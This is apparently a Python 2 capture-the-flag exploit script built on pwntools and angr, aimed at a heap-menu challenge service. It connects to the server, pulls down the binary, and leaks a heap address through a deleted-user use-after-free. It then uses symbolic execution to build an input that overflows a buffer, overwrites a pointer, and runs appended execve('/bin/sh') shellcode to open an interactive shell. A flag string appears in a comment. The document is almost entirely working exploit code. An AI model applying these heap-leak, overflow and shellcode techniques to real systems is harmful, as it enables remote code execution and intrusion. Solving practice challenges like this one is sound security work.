#!/usr/bin/env python
#import angr
import angr
from pwn import *
import base64

# FLAG{FindBufferOverflowAmongTensofFunctions}


host , port = '10.141.0.202' , 8989
y = remote( host , port )
#y = process( './tmp' )


y.sendlineafter( '(y/n)' , 'y' )
y.recvuntil( 'Base64 =================' )
for _ in xrange( 2 ): y.recvline()

o = open( './tmp' , 'w+' )
o.write( base64.b64decode( y.recvline() ) )
o.close()



def add_user( h , w , m ):
    y.sendlineafter( 'n:' , '0' )
    y.sendlineafter( ':' , str( h ) )
    y.sendlineafter( ':' , str( w ) )
    y.sendlineafter( ':' , str( m ) )

def add_msg( idd , data ):
    y.sendlineafter( 'n:' , '1' )
    y.sendlineafter( ':' , str( idd ) )
    y.sendlineafter( ':' , data )

def show_user( idx ):
    y.sendlineafter( 'n:' , '3' )
    y.sendlineafter( ':' , str( idx ) )


def show_msg( idx ):
    y.sendlineafter( 'n:' , '4' )
    y.sendlineafter( ':' , str( idx ) )

def dle_user( idx ):
    y.sendlineafter( 'n:' , '5' )
    y.sendlineafter( ':' , str( idx ) )

def dle_msg( idx ):
    y.sendlineafter( 'n:' , '6' )
    y.sendlineafter( ':' , str( idx ) )


context.arch = 'amd64'

_asm = '''
mov rax, 0x0068732f6e69622f
push rax
xor rsi, rsi
xor rdx, rdx
mov rdi, rsp
xor eax, eax
mov al, 0x3b
syscall
'''

sc = asm( _asm )


add_user( 7 , 7 , 7 )
dle_user( 0 )

l = int( raw_input('len').strip() , 16 )

add_msg( 7 , 'yuawn' )
show_user( 0 )

y.recvuntil('Weight: ')
heap = int( y.recvline().strip() ) - 0x1450
log.success( 'heap -> %s' % hex( heap ) )




print 'AEG'

p = angr.Project( './tmp' , load_options={'auto_load_libs': False} )

state = p.factory.blank_state( addr = int( raw_input('good').strip() , 16 ) )

state.regs.rdi = 0x6020b0

sm = p.factory.simulation_manager( state , immutable = False )

good = int( raw_input('good').strip() , 16 )
bad = []

sm.explore( find = good , avoid = bad )

p = sm.found[0].solver.eval( sm.found[0].memory.load( 0x6020b0 , 0x40 ) , cast_to = str )



print hex(len(p))

p = p.ljust( l + 0x8 , 'Y' )
p += p64( heap + l + 0x430 )
p += sc

add_msg( 7 , p )


y.interactive()